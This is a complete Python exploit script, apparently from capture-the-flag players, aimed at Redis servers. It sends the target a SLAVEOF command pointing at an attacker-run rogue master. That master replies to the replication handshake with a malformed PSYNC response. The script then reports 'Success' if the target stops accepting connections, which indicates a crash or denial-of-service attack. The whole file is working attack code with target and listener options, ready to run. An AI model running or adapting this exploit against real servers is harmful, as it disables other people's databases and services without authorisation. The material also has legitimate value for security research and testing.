#!/usr/bin/env python3
import socket
from optparse import OptionParser
from time import sleep

CLRF = "\r\n"

BANNER = """______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright rainhurt @ 0ops, n0b0dy @ r3kapig
"""


def encode_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd


def encode_cmd(raw_cmd):
    return encode_cmd_arr(raw_cmd.split(" "))


def decode_cmd(cmd):
    if cmd.startswith("*"):
        raw_arr = cmd.strip().split("\r\n")
        return raw_arr[2::2]
    if cmd.startswith("$"):
        return cmd.split("\r\n", 2)[1]
    return cmd.strip().split(" ")


def info(msg):
    print(f"\033[1;32;40m[info]\033[0m {msg}")


def error(msg):
    print(f"\033[1;31;40m[err ]\033[0m {msg}")


def din(sock, cnt=4096):
    global verbose
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;34;40m[->]\033[0m {msg}")
        else:
            print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
    return msg.decode('gb18030')


def dout(sock, msg):
    global verbose
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;33;40m[<-]\033[0m {msg}")
        else:
            print(f"\033[1;33;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")


def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])


class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(encode_cmd(cmd))
        buf = self.recv()
        return buf


class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(('0.0.0.0', self._port))
        self._sock.listen(10)

    def close(self):
        self._sock.close()

    def handle(self, data):
        cmd_arr = decode_cmd(data)
        resp = ""
        phase = 0
        if cmd_arr[0].startswith("PING"):
            resp = "+PONG" + CLRF
            phase = 1
        elif cmd_arr[0].startswith("REPLCONF"):
            resp = "+OK" + CLRF
            phase = 2
        elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
            resp = "+CONTINUE " + "Z" * 40 + " 1" + CLRF
            resp += "1" + CLRF
            phase = 3
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        info(f"Incoming connection {addr[0]}:{addr[1]}")
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            # print(repr(data))
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break


def runserver(rhost, rport, lhost, lport):
    # expolit
    info("Preparing...")
    remote = Remote(rhost, rport)
    rogue = RogueServer(lhost, lport)
    info("Setting master...")
    remote.do(f"SLAVEOF {lhost} {lport}")
    rogue.exp()
    rogue.close()
    rogue = RogueServer(lhost, lport)
    rogue.exp()
    rogue.close()
    info("Checking...")
    sleep(2)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost, rport))
        error("Fail")
    except:
        info("Success")


if __name__ == '__main__':
    print(BANNER)
    parser = OptionParser()
    parser.add_option("--rhost", dest="rh", type="string",
                      help="target host", metavar="REMOTE_HOST")
    parser.add_option("--rport", dest="rp", type="int",
                      help="target redis port, default 6379", default=6379,
                      metavar="REMOTE_PORT")
    parser.add_option("--lhost", dest="lh", type="string",
                      help="rogue server ip", metavar="LOCAL_HOST")
    parser.add_option("--lport", dest="lp", type="int",
                      help="rogue server listen port, default 21000", default=21000,
                      metavar="LOCAL_PORT")
    parser.add_option("-v", "--verbose", action="store_true", default=False,
                      help="Show full data stream")

    (options, args) = parser.parse_args()
    global verbose
    verbose = options.verbose

    if not options.rh or not options.lh:
        parser.error("Invalid arguments")

    info(f"TARGET {options.rh}:{options.rp}")
    info(f"SERVER {options.lh}:{options.lp}")
    try:
        runserver(options.rh, options.rp, options.lh, options.lp)
    except Exception as e:
        error(repr(e))
